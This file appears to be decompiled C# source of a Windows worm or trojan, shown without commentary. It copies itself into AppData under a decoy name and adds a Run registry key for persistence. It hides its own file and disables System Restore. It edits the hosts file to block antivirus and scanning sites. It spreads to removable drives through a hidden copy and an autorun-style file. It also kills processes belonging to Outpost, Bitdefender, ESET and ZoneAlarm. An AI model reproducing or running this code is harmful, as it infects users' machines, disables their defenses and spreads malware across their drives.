using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ns0;

internal class Class7
{
	[DebuggerNonUserCode]
	public Class7()
	{
	}

	public static void smethod_0()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Themes\\Defauts.exe";
			File.Copy(Application.get_ExecutablePath(), text);
			((ServerComputer)Class1.Class0_0).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("1" + Application.get_ProductName(), text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_1()
	{
		try
		{
			File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		try
		{
			string path = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			StreamWriter streamWriter = new StreamWriter(path, append: true);
			string value = "\n 127.0.0.1 www.virustotal.com";
			string text = "\n 127.0.0.1 www.bitdefender.com";
			string text2 = "\n 127.0.0.1 www.virusscan.jotti.org";
			string text3 = "\n 127.0.0.1 www.scanner.novirusthanks.org";
			streamWriter.Write(value);
			streamWriter.Write("\r\n" + text);
			streamWriter.Write("\r\n" + text2);
			streamWriter.Write("\r\n" + text3);
			streamWriter.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_3()
	{
		try
		{
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object)"1", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_4()
	{
		try
		{
			string text = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced";
			((ServerComputer)Class1.Class0_0).get_Registry().SetValue(text, "Hidden", (object)"0", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5()
	{
		string[] logicalDrives = Environment.GetLogicalDrives();
		checked
		{
			int num = logicalDrives.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				DriveInfo driveInfo = new DriveInfo(logicalDrives[num2]);
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					try
					{
						if (!File.Exists(logicalDrives[num2] + "UNrestor.exe"))
						{
							string fileName = Path.GetFileName(Application.get_ExecutablePath());
							File.Copy(fileName, logicalDrives[num2] + "UNrestor", overwrite: true);
							((ServerComputer)Class1.Class0_0).get_FileSystem().WriteAllText(logicalDrives[num2] + "Boot.inf", "[autorun]" + Environment.NewLine + "open=" + logicalDrives[num2] + "UNrestor" + Environment.NewLine + "shellexecute=" + logicalDrives[num2], true);
							File.SetAttributes(logicalDrives[num2] + "UNrestor", FileAttributes.Hidden);
							File.SetAttributes(logicalDrives[num2] + "Boot.inf", FileAttributes.Hidden);
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				num2++;
			}
		}
	}

	public static void smethod_6()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "outpost", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_7()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "npfmsg", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_8()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "bdagent", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_9()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "egui", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}

	public static void smethod_10()
	{
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 <= num4)
				{
					string text = Strings.LCase(processes[num2].ProcessName);
					if (Operators.CompareString(text, "zlclient", false) == 0)
					{
						processes[num2].Kill();
					}
					num2++;
					continue;
				}
				break;
			}
		}
	}
}
